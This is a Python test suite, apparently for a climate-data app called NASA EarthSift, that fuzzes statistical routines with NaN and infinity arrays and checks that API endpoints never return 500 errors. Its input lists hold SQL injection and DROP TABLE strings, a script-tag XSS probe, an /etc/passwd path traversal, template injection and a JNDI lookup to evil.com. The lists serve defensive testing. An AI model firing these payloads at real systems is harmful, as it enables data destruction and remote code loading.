"""
NASA EarthSift — Comprehensive Chaos Engineering & Property-Based Fuzzing Suite
Tests mathematical engines and ASGI API endpoints against hostile, malformed,
and boundary inputs using Hypothesis and adversarial vectors.
Asserts zero unhandled crashes (ZeroDivisionError, FloatingPointError, 500 Server Errors).
"""

import json
import math

import numpy as np
import pytest
from hypothesis import given
from hypothesis import settings as hyp_settings
from hypothesis import strategies as st
from starlette.testclient import TestClient

from app.main import app
from app.science.climate_velocity import compute_climate_velocity
from app.science.copula_hazard import fit_bivariate_copula
from app.science.spatial import compute_global_morans_i, compute_lisa_clusters
from app.science.trend import (
    benjamini_hochberg_fdr,
    mann_kendall_test,
    pettitt_changepoint_test,
    sens_slope,
)

client = TestClient(app)


def _assert_json_serializable_no_nan_inf(obj, path="root"):
    """Assert all floats in dictionary/list are valid finite JSON numbers (no NaN, inf)."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            _assert_json_serializable_no_nan_inf(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _assert_json_serializable_no_nan_inf(v, f"{path}[{i}]")
    elif isinstance(obj, (float, np.floating)):
        assert math.isfinite(obj), f"Non-finite float ({obj}) found at {path}"
    # Verify strict json serialization
    json.dumps(obj, default=str)


# =====================================================================
# 1. Mathematical Engine Chaos Fuzzing
# =====================================================================

ADVERSARIAL_1D_VECTORS = [
    np.array([], dtype=float),
    np.array([np.nan]),
    np.array([np.nan] * 12),
    np.array([0.0] * 12),
    np.array([-0.0] * 12),
    np.array([42.0]),
    np.array([1e-15, -1e-15] * 6),
    np.array([1.0, 1e9, -1e9, 2.0, np.nan, 3.0, 1e12, -1e12]),
    np.array([np.nextafter(np.float32(0), np.float32(1))] * 10),
    np.array([np.inf, -np.inf, np.nan, 5.0, 6.0]),
]


@pytest.mark.parametrize("arr", ADVERSARIAL_1D_VECTORS)
def test_mann_kendall_adversarial_1d(arr):
    """Assert mann_kendall_test handles pathological 1D arrays without crashing."""
    res = mann_kendall_test(arr)
    assert isinstance(res, dict)
    assert "p_value" in res
    assert "tau" in res
    _assert_json_serializable_no_nan_inf(res)


@pytest.mark.parametrize("arr", ADVERSARIAL_1D_VECTORS)
def test_sens_slope_adversarial_1d(arr):
    """Assert sens_slope handles pathological 1D arrays without crashing."""
    res = sens_slope(arr)
    assert isinstance(res, dict)
    assert "slope" in res
    assert "intercept" in res
    _assert_json_serializable_no_nan_inf(res)


@pytest.mark.parametrize("arr", ADVERSARIAL_1D_VECTORS)
def test_pettitt_adversarial_1d(arr):
    """Assert pettitt_changepoint_test handles pathological 1D arrays without crashing."""
    res = pettitt_changepoint_test(series=arr)
    assert isinstance(res, dict)
    assert "p_value" in res
    _assert_json_serializable_no_nan_inf(res)


@pytest.mark.parametrize("arr", ADVERSARIAL_1D_VECTORS)
def test_fdr_adversarial_1d(arr):
    """Assert benjamini_hochberg_fdr handles pathological p-value arrays without crashing."""
    q_vals, is_sig = benjamini_hochberg_fdr(arr)
    assert len(q_vals) == len(arr)
    assert len(is_sig) == len(arr)
    for q in q_vals:
        if not np.isnan(q):
            assert math.isfinite(q)


ADVERSARIAL_2D_VECTORS = [
    np.full((5, 5), np.nan),
    np.zeros((5, 5)),
    np.full((5, 5), -0.0),
    np.array([[42.0]]),
    np.tile([1e-15, -1e-15], (4, 4)),
    np.random.default_rng(42).standard_normal((6, 6)),
    np.full((4, 4), np.nextafter(np.float32(0), np.float32(1))),
    np.array([[np.nan, 1.0], [2.0, np.nan]]),
]


@pytest.mark.parametrize("arr", ADVERSARIAL_2D_VECTORS)
def test_morans_i_and_lisa_adversarial_2d(arr):
    """Assert Moran's I and LISA handle pathological 2D spatial fields without crashing."""
    res_m = compute_global_morans_i(arr)
    assert isinstance(res_m, dict)
    _assert_json_serializable_no_nan_inf(res_m)

    clusters, p_vals = compute_lisa_clusters(arr)
    assert clusters.shape == arr.shape
    assert p_vals.shape == arr.shape


def test_copula_and_velocity_adversarial():
    """Assert bivariate copula and climate velocity handle pathological vectors."""
    # Copula
    for x in [np.full(10, np.nan), np.zeros(10), np.array([1.0, 2.0, 3.0, 4.0, 5.0])]:
        res_cop = fit_bivariate_copula(x, x)
        assert isinstance(res_cop, dict)
        _assert_json_serializable_no_nan_inf(res_cop)

    # Climate velocity
    lats = np.array([30.0, 31.0, 32.0])
    lons = np.array([-100.0, -99.0, -98.0])
    slopes = np.full((3, 3), np.nan)
    res_vel = compute_climate_velocity(slopes, lats, lons)
    assert isinstance(res_vel, dict)
    _assert_json_serializable_no_nan_inf(res_vel)


# =====================================================================
# Hypothesis Property-Based Fuzzing
# =====================================================================

@hyp_settings(max_examples=30, deadline=None)
@given(
    st.lists(
        st.one_of(
            st.floats(min_value=-1e12, max_value=1e12),
            st.just(float("nan")),
            st.just(float("inf")),
            st.just(float("-inf")),
        ),
        min_size=0,
        max_size=30
    )
)
def test_hypothesis_fuzz_trend_engines(values):
    """Hypothesis fuzzing across Mann-Kendall, Theil-Sen, Pettitt, and FDR."""
    arr = np.array(values, dtype=float)

    # 1. Mann-Kendall
    res_mk = mann_kendall_test(arr)
    _assert_json_serializable_no_nan_inf(res_mk)

    # 2. Theil-Sen
    res_sen = sens_slope(arr)
    _assert_json_serializable_no_nan_inf(res_sen)

    # 3. Pettitt
    res_pet = pettitt_changepoint_test(series=arr)
    _assert_json_serializable_no_nan_inf(res_pet)

    # 4. FDR
    q_vals, is_sig = benjamini_hochberg_fdr(arr)
    assert len(q_vals) == len(arr)


# =====================================================================
# 2. REST API & Endpoint Fuzzing (Zero 500 Errors)
# =====================================================================

FUZZ_STRINGS = [
    "' OR '1'='1' --",
    "<script>alert(1)</script>",
    "🚀🌍🔥🌧️❄️",
    "SELECT * FROM users; DROP TABLE cache;",
    "../../../../etc/passwd",
    "\x00\x00\x00\x00",
    "A" * 2000,
    "DROP DATABASE IF EXISTS test;",
    "{{ 7 * 7 }}",
    "${jndi:ldap://evil.com/x}",
]


@pytest.mark.parametrize("query_str", FUZZ_STRINGS)
def test_api_fuzz_copilot_query(query_str):
    """Verify POST /api/v1/copilot/parse-query handles hostile injection strings safely."""
    res = client.post("/api/v1/copilot/parse-query", json={"query": query_str})
    assert res.status_code in (200, 400, 422), f"Unexpected code {res.status_code}: {res.text}"
    assert "internal server error" not in res.text.lower()


ADVERSARIAL_ANALYSIS_REQUESTS = [
    # Inverted temporal order
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 2020, "end_year": 2010},
    # Out of range temporal window
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 1800, "end_year": 2020},
    # 0-width bounding box (min_lon == max_lon)
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 2000, "end_year": 2020, "bbox": [10.0, 20.0, 10.0, 30.0]},
    # Inverted latitude bounding box
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 2000, "end_year": 2020, "bbox": [10.0, 40.0, 20.0, 30.0]},
    # Inverted longitude bounding box
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 2000, "end_year": 2020, "bbox": [30.0, 20.0, 20.0, 40.0]},
    # Out of range WGS84 coordinates
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 2000, "end_year": 2020, "bbox": [-200.0, -100.0, 200.0, 100.0]},
    # SQLi in dataset/variable
    {"dataset_id": "' OR 1=1 --", "variable_id": "T2M", "start_year": 2000, "end_year": 2020},
    # XSS in variable
    {"dataset_id": "merra2_reanalysis", "variable_id": "<script>alert(1)</script>", "start_year": 2000, "end_year": 2020},
    # Extreme significance alpha
    {"dataset_id": "merra2_reanalysis", "variable_id": "T2M", "start_year": 2000, "end_year": 2020, "alpha": 0.99},
]


@pytest.mark.parametrize("req_payload", ADVERSARIAL_ANALYSIS_REQUESTS)
def test_api_fuzz_analysis_endpoints(req_payload):
    """Verify /analysis and /analysis/compound reject hostile payloads with 400/404/422 (never 500)."""
    res1 = client.post("/api/v1/analysis", json=req_payload)
    assert res1.status_code in (200, 400, 404, 422), f"POST /analysis returned {res1.status_code}: {res1.text}"
    assert "internal server error" not in res1.text.lower()

    res2 = client.post("/api/v1/analysis/compound", json=req_payload)
    assert res2.status_code in (200, 400, 404, 422), f"POST /analysis/compound returned {res2.status_code}: {res2.text}"
    assert "internal server error" not in res2.text.lower()


ADVERSARIAL_COMPARE_REQUESTS = [
    {"analysis_id": "non_existent_analysis_id", "lat_a": 30.0, "lon_a": -100.0, "lat_b": 35.0, "lon_b": -95.0},
    {"analysis_id": "' OR '1'='1' --", "lat_a": 30.0, "lon_a": -100.0, "lat_b": 35.0, "lon_b": -95.0},
    {"analysis_id": "test_id", "lat_a": 999.0, "lon_a": -999.0, "lat_b": -999.0, "lon_b": 999.0},
    {"analysis_id": "<script>alert(1)</script>", "lat_a": 0.0, "lon_a": 0.0, "lat_b": 0.0, "lon_b": 0.0},
]


@pytest.mark.parametrize("comp_payload", ADVERSARIAL_COMPARE_REQUESTS)
def test_api_fuzz_compare_endpoint(comp_payload):
    """Verify /analysis/compare returns structured 400/404/422 on invalid/adversarial comparisons."""
    res = client.post("/api/v1/analysis/compare", json=comp_payload)
    assert res.status_code in (200, 400, 404, 422), f"POST /analysis/compare returned {res.status_code}: {res.text}"
    assert "internal server error" not in res.text.lower()


@pytest.mark.parametrize("expl_id", ["non_existent_id", "' OR 1=1 --", "<script>alert(1)</script>", ""])
def test_api_fuzz_explain_endpoint(expl_id):
    """Verify /explain returns structured 400/404/422 on invalid analysis IDs."""
    res = client.post("/api/v1/explain", json={"analysis_id": expl_id})
    assert res.status_code in (200, 400, 404, 422), f"POST /explain returned {res.status_code}: {res.text}"
    assert "internal server error" not in res.text.lower()
